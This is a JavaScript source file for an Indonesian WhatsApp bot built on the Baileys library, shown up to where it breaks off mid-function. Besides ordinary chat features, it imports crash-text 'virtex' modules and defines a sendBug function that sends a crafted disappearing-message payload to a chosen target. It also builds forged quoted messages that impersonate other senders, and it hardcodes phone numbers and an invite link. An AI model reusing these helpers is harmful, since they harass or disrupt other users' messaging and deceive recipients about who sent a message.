// INI CUMA RECODE RECODE DOANG KOK
// UDAH GW RECODE JANGAN LO RECODE LAGI
// GUE BUKAN MASTAH CUMA BELAJAR ISENG ISENG
const {
    WAConnection: _WAConnection,
    MessageType,
    Presence,
    MessageOptions,
    Mimetype,
    WALocationMessage,
    WAMessageProto,
    ReconnectMode,
    ProxyAgent,
    ChatModification,
    GroupSettingChange,
    WA_MESSAGE_STUB_TYPES,
    WA_DEAFULT_EPHEMERAL,
    waChatKey,
    mentionedJid,
    processTime,
    prepareMessageFromContent,
    relayWAMessage
} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const { RemoveBgResult, removeBackgroundFromImageBase64, removeBackgroundFromImageFile } = require('remove.bg') //paid
const gionov = require('zeev-api')
const ytsd = require('ytsr')
const yts = require('yt-search')
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const request = require('request')
const util = require('util')
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ig = require("insta-fetcher")
const cheerio = require('cheerio')
const fromData = require('form-data')
const os = require('os')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const toMs = require('ms')
const fetch = require('node-fetch')
const imgbb = require('imgbb-uploader')
const Math_js = require('mathjs')
const {
    EmojiAPI
} = require("emoji-api")
const emoji = new EmojiAPI()
const speed = require('performance-now')
const {
    color,
    bgcolor
} = require('./lib/color')
const {
    exec
} = require('child_process')
const {
    fetchJson
} = require('./lib/fetcher')
const {
    uploadimg,
    upload
} = require('./lib/uploadimg')
const {
    webp2mp4File
} = require('./lib/webp2mp4')
const {
    lirikLagu
} = require('./lib/lirik.js')
const {
    wikiSearch
} = require('./lib/wiki.js')
const {
    herolist
} = require('./lib/herolist.js')
const {
    herodetails
} = require('./lib/herodetail.js')
const {
    jadibot,
    stopjadibot,
    listjadibot
} = require('./lib/jadibot')
const {
    mediafireDl
} = require('./lib/mediafire.js')
const {
    virtex
} = require('./virtex/virtex')
const {
    virtex2
} = require('./virtex/virtex2')
const {
    virtex3
} = require('./virtex/virtex3')
const {
    virtex4
} = require('./virtex/virtex4')
const {
    virtex5
} = require('./virtex/virtex5')
const {
    virtex6
} = require('./virtex/virtex6')
const {
    virtex7
} = require('./virtex/virtex7')
const {
    virtex8
} = require('./virtex/virtex8')
const {
    virtex9
} = require('./virtex/virtex9')
const {
    ngazap
} = require('./virtex/ngazap')
const {
    virtag
} = require('./virtex/virtag')
const {
    emoji2
} = require('./virtex/emoji2')
const {
    pinterest
} = require('./lib/pinterest')
const {
    addCommands,
    checkCommands,
    deleteCommands
} = require('./lib/autoresp')
const {
    yta,
    ytv,
    buffer2Stream,
    ytsr,
    baseURI,
    stream2Buffer,
    noop
} = require('./lib/ytdl')
const {
    getBuffer,
    getGroupAdmins,
    getRandom,
    start,
    info,
    success,
    close
} = require('./lib/functions')
const client = new WAConnection()

// STICKER WM
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./lib/exif')
const exif = new Exif()

// DATABASE
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const badword = JSON.parse(fs.readFileSync('./database/badword.json'))
const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
const _registered = JSON.parse(fs.readFileSync('./database/user.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const antidelete = JSON.parse(fs.readFileSync('./database/antidelete.json'))
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))

ky_ttt = []
tttawal = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
cmhit = []
autorespon = true
playmusic = false
baterai = {
    battery: "" || "Tidak Terdeteksi",
    isCharge: "" || false
}
offline = false
publik = true
waktuafk = 'Nothing'
alasanafk = 'Nothing'
NamaBot = settings.NamaBot
NomorOwner = settings.NomorOwner
NamaOwner = settings.NamaOwner
multi = true
readGc = false
readPc = false
autovn = false
autoketik = false
nopref = false

// APIKEY
ZeksApi = settings.ZeksApi
XcoderApi = settings.XcoderApi
HunterApi = settings.HunterApi
xchillds = settings.xchillds
VikoApi = settings.VikoApi

// TIME
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")

function kyun(seconds) {
    function pad(s) {
        return (s < 10 ? '0' : '') + s;
    }
    var hours = Math.floor(seconds / (60 * 60));
    var minutes = Math.floor(seconds % (60 * 60) / 60);
    var seconds = Math.floor(seconds % 60);

    //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
    return `${pad(hours)}Jam ${pad(minutes)}Menit ${pad(seconds)}Detik`
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function waktu(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " hari, ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " jam, ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " menit, ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? " second" : " detik") : "";
    return dDisplay + hDisplay + mDisplay + sDisplay;
}
const addafk = (from) => {
    const obj = {
        id: from,
        expired: Date.now() + toMs('10m')
    }
    afk.push(obj)
    fs.writeFileSync('./database/afk.json', JSON.stringify(afk))
}
const cekafk = (_dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            _dir.splice(position, 1)
            fs.writeFileSync('./database/afk.json', JSON.stringify(_dir))
        }
    }, 1000)
}
const isAfk = (idi) => {
    let status = false
    Object.keys(afk).forEach((i) => {
        if (afk[i].id === idi) {
            status = true
        }
    })
    return status
}
const addCmd = (id, command) => {
    const obj = {
        id: id,
        chats: command
    }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
module.exports = giie = async (giie, mek) => {
    try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
        if (!mek.message) return
        if (mek.key && mek.key.remoteJid == 'status@broadcast') return
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const typei = Object.keys(mek.message)[0]
        global.prefix
        me = giie.user
        m = simple.smsg(giie, mek)
        const antibot = m.isBaileys
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const type = Object.keys(mek.message)[0]
        const {
            text,
            extendedText,
            contact,
            location,
            liveLocation,
            image,
            video,
            sticker,
            document,
            audio
        } = MessageType
        const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        //  giie.on("CB:action,,battery", json => {
        //    const battery = json[2][0][1].value
        //    const persenbat = parseInt(battery)
        //    baterai.battery = `${persenbat}%`
        //   baterai.isCharge = json[2][0][1].live
        // })
        if (multi) {
            var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref) {
                prefix = ''
            } else {
                prefix = prefa
            }
        }
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
        isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
            isStc !== "" && content.includes("conversation")
        const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
        const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
        const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const isCmd = body.startsWith(prefix)
        const arg = budy.slice(command.length + 2, budy.length)
        const c = args.join(' ')
        var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const dfrply = fs.readFileSync('./gio.jpg')
        const dfrply2 = fs.readFileSync('./thub.jpg')
        const dfrply3 = fs.readFileSync('./gio.jpeg')
        const botNumber = giie.user.jid
        const ownerNumberr = ["6289654560615@s.whatsapp.net", "994400222269@s.whatsapp.net", "6289654560615@s.whatsapp.net", "6289654560615@s.whatsapp.net", `${NomorOwner}@s.whatsapp.net`]
        const isGroup = from.endsWith('@g.us')
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const sender = mek.key.fromMe ? giie.user.jid : isGroup ? mek.participant : mek.key.remoteJid
        const senderNumber = sender.split("@")[0]
        const conts = mek.key.fromMe ? giie.user.jid : giie.contacts[sender] || {
            notify: jid.replace(/@.+/, '')
        }
        const pushname = mek.key.fromMe ? giie.user.name : conts.notify || conts.vname || conts.name || '-'
        const totalchat = await giie.chats.all()
        const groupMetadata = isGroup ? await giie.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupId = isGroup ? groupMetadata.jid : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const groupDesc = isGroup ? groupMetadata.desc : ''
        const isNsfw = isGroup ? nsfww.includes(from) : false
        const groupOwner = isGroup ? groupMetadata.owner : ''
        const isOwner = ownerNumberr.includes(sender)
        const isGroupAdmins = groupAdmins.includes(sender) || false
        const isKickArea = isGroup ? kickarea.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isBadword = isGroup ? badword.includes(from) : false
        const isWelkom = isGroup ? welkom.includes(from) : true
        const isAntidelete = isGroup ? antidelete.includes(from) : true
        const isAuto = isGroup ? autosticker.includes(from) : true
        const isMuted = isGroup ? mute.includes(from) : false
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        cmhit.push(command)
        mess = {
            wait: `_Oke ${pushname} Sedang Di Proses ..._`,
            success: `_Hai ${pushname} request completed_ ✅`,
            error: {
                stick: `_Hai ${pushname} cannot access  videos_ 🚫`,
                Iv: `_Hai ${pushname} invalid link_ 🚫`,
                api: `_Hai ${pushname} server sedang error_ 🚫`
            },
            only: {
                group: `_Hai ${pushname} Only for with the group_ ⚠️`,
                ownerG: `_Hai ${pushname} Only for group owners_ ⚠️`,
                ownerB: `_Hai ${pushname} Only for bot owners_ ⚠️`,
                admin: `_Hai ${pushname} Only for group admins_ ⚠️`,
                Badmin: `_Hai ${pushname} Make the bot a group admin_ ⚠️`
            }
        }
        //SET CREATOR
        const captionfake = `hii ${pushname}`
        const creatorfotter = `_Powered by: Ayogi Ak_`
        
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = giie.prepareMessageFromContent(from, {
                "listMessage": {
                    "title": title,
                    "description": desc,
                    "buttonText": "Pilih Disini",
                    "footerText": "SEMOGA DAPAT MEMBANTU",
                    "listType": "SINGLE_SELECT",
                    "sections": list
                }
            }, {})
            return giie.relayWAMessage(po, {
                waitForAck: true
            })
        }
        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        if (antibot === true) return
        const katalog = (teks) => {
            res = giie.prepareMessageFromContent(from, {
                "orderMessage": {
                    "message": teks,
                    "footerText": "*_© By: Ayogi Akbar_*",
                    "thumbnail": ofrply,
                    "surface": 'CATALOG'
                }
            }, {
                quoted: fgi
            })
            giie.relayWAMessage(res)
        }
        const fakegroup = (teks) => {
            giie.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`,
                        ...(from ? {
                            remoteJid: "6289654560615-1635442668@g.us"
                        } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Hello ${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": ofrply,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const grupinv = (teks) => {
            grup = giie.prepareMessageFromContent(from, {
                "groupInviteMessage": {
                    "groupJid": '6289654560615-1616169743@g.us',
                    "inviteCode": 'https://chat.whatsapp.com/Kw69Oel34Nd0JuluvFNVKt',
                    "groupName": `${NamaBot}`,
                    "footerText": "*_© By: Ayogi Akbar_*",
                    "jpegThumbnail": ofrply,
                    "caption": teks
                }
            }, {
                quoted: fgi
            })
            giie.relayWAMessage(grup)
        }
        idttt = []
        players1 = []
        players2 = []
        gilir = []
        for (let t of ky_ttt) {
            idttt.push(t.id)
            players1.push(t.player1)
            players2.push(t.player2)
            gilir.push(t.gilir)
        }
        const isTTT = isGroup ? idttt.includes(from) : false
        isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
        try {
            pporang = await giie.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
        } catch {
            pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
        }

        const ofrply = await getBuffer(pporang)
        const thubb = fs.readFileSync('./thub.jpg')
        const sekarang = new Date().getTime();
        //-
        //WAKTU
        var ase = new Date();
        var jamss = ase.getHours();
        switch (jamss) {
            case 0:
                jamss = "Jangan gadang kak";
                break;
            case 1:
                jamss = "Jangan gadang kak";
                break;
            case 2:
                jamss = "Jangan gadang kak";
                break;
            case 3:
                jamss = "Jangan gadang kak";
                break;
            case 4:
                jamss = "Jangan lupa sholat Subuh kak";
                break;
            case 5:
                jamss = "Selamat pagi";
                break;
            case 6:
                jamss = "Selamat pagi";
                break;
            case 7:
                jamss = "Selamat pagi";
                break;
            case 8:
                jamss = "Selamat pagi";
                break;
            case 9:
                jamss = "Selamat pagi";
                break;
            case 10:
                jamss = "Selamat pagi";
                break;
            case 11:
                jamss = "Selamat siang";
                break;
            case 12:
                jamss = "Jangan lupa sholat Zuhur kak";
                break;
            case 13:
                jamss = "Selamat siang";
                break;
            case 14:
                jamss = "Selamat sore";
                break;
            case 15:
                jamss = "Jangan lupa sholat Ashar kak";
                break;
            case 16:
                jamss = "Selamat sore";
                break;
            case 17:
                jamss = "Selamat sore";
                break;
            case 18:
                jamss = "Selamat malam";
                break;
            case 19:
                jamss = "Jangan lupa sholat Isya kak";
                break;
            case 20:
                jamss = "Selamat malam";
                break;
            case 21:
                jamss = "Selamat malam";
                break;
            case 22:
                jamss = "Selamat malam";
                break;
            case 23:
                jamss = "Selamat malam";
                break;
        }
        var tampilUcapan = "" + jamss;
        const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
        let d = new Date
        let locale = 'id'
        let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
        const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
        const week = d.toLocaleDateString(locale, {
            weekday: 'long'
        })
        const calender = d.toLocaleDateString(locale, {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        })

        // FAKE REPLY BY YOGI PEWE
        // PRODUCT
        const ftok = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "16505434800@s.whatsapp.net"
                } : {})
            },
            message: {
                "productMessage": {
                    "product": {
                        "productImage": {
                            "mimetype": "image/jpeg",
                            "jpegThumbnail": dfrply2 //Gambarnye
                        },
                        "title": `${tampilUcapan} ${pushname}`, //Kasih namalu 
                        "description": `${tampilUcapan} ${pushname}`,
                        "currencyCode": "USD",
                        "priceAmount1000": "2000",
                        "retailerId": `${tampilUcapan} ${pushname}`,
                        "productImageCount": 1
                    },
                    "businessOwnerJid": `0@s.whatsapp.net`
                }
            }
        }
        // TROLI
        const ftrol = {
            key: {
                participant: '0@s.whatsapp.net'
            },
            message: {
                orderMessage: {
                    itemCount: 14,
                    status: 1,
                    surface: 1,
                    message: `Developer by: Ayogi ak`, //Kasih namalu
                    orderTitle: `${tampilUcapan} ${pushname}`,
                    thumbnail: dfrply2, //Gambarnye
                    sellerJid: '0@s.whatsapp.net'
                }
            }
        }
        // LOCATION
        const floc = {
            key: {
                "participant": "0@s.whatsapp.net",
                "remoteJid": "0@s.whatsapp.net"
            },
            message: {
                liveLocationMessage: {
                    caption: `${tampilUcapan} ${pushname}`,
                    jpegThumbnail: dfrply2
                }
            }
        }
        // DOCUMENT
        const fdoc = {
            key: {
                participant: '0@s.whatsapp.net',
            },
            message: {
                documentMessage: {
                    title: `${tampilUcapan} ${pushname}`,
                    jpegThumbnail: dfrply2
                }
            }
        }
        // VIDEO
        const fvid = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "6289654560615-1635442668@g.us"
                } : {})
            },
            message: {
                "videoMessage": {
                    "title": `${tampilUcapan} ${pushname}`,
                    "h": `${tampilUcapan} ${pushname}`,
                    'duration': '1',
                    'caption': `${tampilUcapan} ${pushname}`,
                    'jpegThumbnail': dfrply
                }
            }
        }
        // GROUPINVITE
        const finv = {
            "key": {
                "fromMe": false,
                "participant": "0@s.whatsapp.net",
                "remoteJid": "0@s.whatsapp.net"
            },
            "message": {
                "groupInviteMessage": {
                    "groupJid": "6289654560615-1635442668@g.us",
                    "inviteCode": `${tampilUcapan} ${pushname}`,
                    "groupName": `${tampilUcapan} ${pushname}`,
                    "caption": `${tampilUcapan} ${pushname}`,
                    'jpegThumbnail': dfrply
                }
            }
        }
        // STICKER
        const fstick = {
            "key": {
                "participant": `0@s.whatsapp.net`,
                "remoteJid": "6289654560615-1635442668@g.us",
                "fromMe": false,
                "id": "3B64558B07848BD81108C1D14712018E"
            },
            "message": {
                "stickerMessage": {
                    "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
                    "pngThumbnail": dfrply,
                    "mimetype": "image/webp",
                    "height": 64,
                    "width": 64,
                    "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
                    "fileLength": "60206",
                    "firstFrameLength": 3626,
                    "isAnimated": false
                }
            },
            "messageTimestamp": "1614070775",
            "status": "PENDING"
        }
        // GIF
        const fgi = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "6289654560615-1635442668@g.us"
                } : {})
            },
            message: {
                "videoMessage": {
                    "title": `Hello ${pushname}`,
                    "h": `Hello ${pushname}`,
                    'duration': '1',
                    'gifPlayback': 'true',
                    'caption': `Hello ${pushname}`,
                    'jpegThumbnail': ofrply
                }
            }
        }
        // TEXT WITH THUMBNAIL
        const ftex = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "6289654560615-1635442668@g.us"
                } : {})
            },
            message: {
                "extendedTextMessage": {
                    "text": `${tampilUcapan} ${pushname}`,
                    "title": `${tampilUcapan} ${pushname}`,
                    'jpegThumbnail': dfrply
                }
            }
        }
        // VN
        const fvoc = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "6289654560615-1635442668@g.us"
                } : {})
            },
            message: {
                "audioMessage": {
                    "mimetype": "audio/ogg; codecs=opus",
                    "seconds": "99999",
                    "ptt": "true"
                }
            }
        }
        const sendBug = async (target) => {
            await giie.relayWAMessage(
                giie.prepareMessageFromContent(
                    target,
                    giie.prepareDisappearingMessageSettingContent(0), {}
                ), {
                    waitForAck: true
                })
        }
        ///Button Text
        const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
            const buttonMessage = {
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 1
            }
            giie.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
        }
        ///Button Image
        const sendButImage = async (id, text1, desc1, gam1, but = [], options = {}) => {
            kma = gam1
            mhan = await giie.prepareMessage(from, kma, image)
            const buttonMessages = {
                imageMessage: mhan.message.imageMessage,
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 4
            }
            giie.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }
        ///Button Video
        const sendButVideo = async (id, text1, desc1, vid1, but = [], options = {}) => {
            kma = vid1
            mhan = await giie.prepareMessage(from, kma, video)
            const buttonMessages = {
                videoMessage: mhan.message.videoMessage,
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 5
            }
            giie.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }
        ///Button Location
        const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
            kma = gam1
            mhan = await giie.prepareMessage(from, kma, location)
            const buttonMessages = {
                locationMessage: mhan.message.locationMessage,
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 6
            }
            giie.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }
        if (!mek.key.remoteJid.endsWith('@g.us') && offline) {
            if (!mek.key.fromMe) {
                if (isAfk(mek.key.remoteJid)) return
                addafk(mek.key.remoteJid)
                heheh = ms(Date.now() - waktuafk)
                hooh = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/blackpink?text=${pushname}`)
                ganz = await getBuffer(hooh.result)
                menu = `*_Halo ${pushname}_* 🤗\n_🔇 Maaf untuk saat ini saya (echa) tidak bisa membalas pesan anda, Dikarnakan saya sedang offline, Silahkan tinggalkan pesan dan saya akan balas nanti_\nTerimakasih 🙏`
                buttons = [{
                    buttonId: `command`,
                    buttonText: {
                        displayText: `Hai
aku ${anu_user}, kamu lagi sibuk ya ? aku cuma mau bilang kalau aku tuh selama ini memendam perasaan sama kamu 😔, jujur aku gak kuat jika harus dipendam ini semua sendirian 🙍‍♂️, ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam, aku cinta echa 🥰,
Aku hanya manusia biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu 😞. Namun, jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. Maukah kamu menerima cintaku cha 🌹 ? `
                    },
                    type: 1
                }, {
                    buttonId: `giie`,
                    buttonText: {
                        displayText: 'My Echa'
                    },
                    type: 1
                }]
                imageMsg = (await giie.prepareMessageMedia(ganz, 'imageMessage')).imageMessage
                buttonsMessage = {
                    contentText: `*_Halo ${pushname}_* 🤗\n_🔊 Maaf untuk saat ini saya (echa) tidak bisa membalas pesan anda, Dikarnakan saya sedang offline, Silahkan tinggalkan pesan dan saya akan balas nanti_\nTerimakasih 🙏 `,
                    footerText: 'Developer by: Ayogiak|Echa',
                    imageMessage: imageMsg,
                    buttons: buttons,
                    headerType: 4
                }
                prep = await giie.prepareMessageFromContent(from, {
                    buttonsMessage
                }, {
                    quoted: fgi
                })
                giie.relayWAMessage(prep)
            }
        }
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
            if (!mek.key.fromMe) {
                if (mek.message.extendedTextMessage != undefined) {
                    if (mek.message.extendedTextMessage.contextInfo != undefined) {
                        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
                            for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
                                if (ment === giie.user.jid) {
                                    if (isAfk(mek.key.remoteJid)) return
                                    addafk(mek.key.remoteJid)
                                    heheh = ms(Date.now() - waktuafk)
                                    hooh = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/blackpink?text=${pushname}  `)
                                    ganz = await getBuffer(hooh.result)
                                    menu = `*_Halo ${pushname}_* 🤗\n_🔇 Maaf untuk saat ini saya (echa) tidak bisa membalas pesan anda, Dikarnakan saya sedang offline, Silahkan tinggalkan pesan dan saya akan balas nanti_\nTerimakasih 🙏`
                                    buttons = [{
                    buttonId: `command`,
                    buttonText: {
                        displayText: `Hai
aku ${anu_user}, kamu lagi sibuk ya ? aku cuma mau bilang kalau aku tuh selama ini memendam perasaan sama kamu 😔, jujur aku gak kuat jika harus dipendam ini semua sendirian 🙍‍♂️, ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam, aku cinta echa 🥰,
Aku hanya manusia biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu 😞. Namun, jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. Maukah kamu menerima cintaku cha 🌹 ? `
                    },
                    type: 1
                }, {
                    buttonId: `giie`,
                    buttonText: {
                        displayText: 'My Echa'
                    },
                    type: 1
                }]
                imageMsg = (await giie.prepareMessageMedia(ganz, 'imageMessage')).imageMessage
                buttonsMessage = {
                    contentText: `*_Halo ${pushname}_* 🤗\n_🔊 Maaf untuk saat ini saya (echa) tidak bisa membalas pesan anda, Dikarnakan saya sedang offline, Silahkan tinggalkan pesan dan saya akan balas nanti_\nTerimakasih 🙏 `,
                    footerText: 'Developer by: Ayogiak|Echa',
                    imageMessage: imageMsg,
                    buttons: buttons,
                    headerType: 4
                }
                prep = await giie.prepareMessageFromContent(from, {
                    buttonsMessage
                }, {
